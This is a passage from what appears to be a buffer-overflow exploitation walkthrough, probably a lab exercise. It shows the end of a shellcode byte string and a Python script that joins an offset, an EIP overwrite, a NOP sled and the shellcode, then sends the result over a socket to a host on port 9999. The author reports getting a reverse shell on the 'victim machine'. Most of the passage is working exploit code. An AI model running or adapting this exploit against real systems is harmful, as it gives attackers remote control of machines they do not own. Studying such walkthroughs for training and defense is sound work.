        b"\x36\x76\xd1\xd3\x47\x5f\x16\x87\x17\xf7\xbf\xa8\xf3\x07"
        b"\x3f\x7d\x53\x57\xef\x2e\x14\x07\x4f\x9f\xfc\x4d\x40\xc0"
        b"\x1d\x6e\x8a\x69\xb7\x95\x5d\x56\xe0\x95\x8a\x3e\xf3\x95"
        b"\xb5\x05\x7a\x73\xdf\x69\x2b\x2c\x48\x13\x76\xa6\xe9\xdc"
        b"\xac\xc3\x2a\x56\x43\x34\xe4\x9f\x2e\x26\x91\x6f\x65\x14"
        b"\x34\x6f\x53\x30\xda\xe2\x38\xc0\x95\x1e\x97\x97\xf2\xd1"
        b"\xee\x7d\xef\x48\x59\x63\xf2\x0d\xa2\x27\x29\xee\x2d\xa6"
        b"\xbc\x4a\x0a\xb8\x78\x52\x16\xec\xd4\x05\xc0\x5a\x93\xff"
        b"\xa2\x34\x4d\x53\x6d\xd0\x08\x9f\xae\xa6\x14\xca\x58\x46"
        b"\xa4\xa3\x1c\x79\x09\x24\xa9\x02\x77\xd4\x56\xd9\x33\xf4"
        b"\xb4\xcb\x49\x9d\x60\x9e\xf3\xc0\x92\x75\x37\xfd\x10\x7f"
        b"\xc8\xfa\x09\x0a\xcd\x47\x8e\xe7\xbf\xd8\x7b\x07\x13\xd8"
        b"\xa9"
    )
    
    
    payload = before_eip + eip + b"\x90"*16 + shellcode
    
    # Conexion con socket
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.0.7", 9999))
    s.send(payload)
    s.close()
we run our script


![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXf-i6Fp9yHQaE22GdFdFz71-p0Njlgl9JuvqAGe0vkHJfwFTGnWgTBGuERoa1nF9cWR8DLbsO1VPb9Bze14CbyrGwMipEKyZ_bKyVowic8Lmv4mFC9spasFSRHzuqAKAWgmnwX1zmbrnjDBEuhcxKdLNsDg?key=7yZZI6nZ3Oixa1gtoznlDg)

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXf549BbhWRjaj_pq04U4U5Bh_Ja_O0SM2mwhcCbTgi7W4dR2KXs6HHWiiNJXPQI4blS3v6heFzrM_3yKI8bCXr2F6ADqaJTDKNhPTB2mNUc5vlOdMKZxIRQV8rynBxlrsGOgi0C8x60bcoWyXO6RoG_wX2d?key=7yZZI6nZ3Oixa1gtoznlDg)

![enter image description here](https://lh7-us.googleusercontent.com/docsz/AD_4nXeKvqEUZcAIIo2B_XQSS--x32iBh1MxIM20vOHxJ3RFUbfjkFcYAqQ_jvKwhN0rPJaQSdNWOaKe3G8IC8zbvRJHsitNIMg0nTx2c4IFAcsZUQVfRdar32PU395ZhC-HTPordCgldzLEc1hd163vkD6vbGNo?key=7yZZI6nZ3Oixa1gtoznlDg)

And that's it, we have obtained access to a reverse shell to our victim machine.
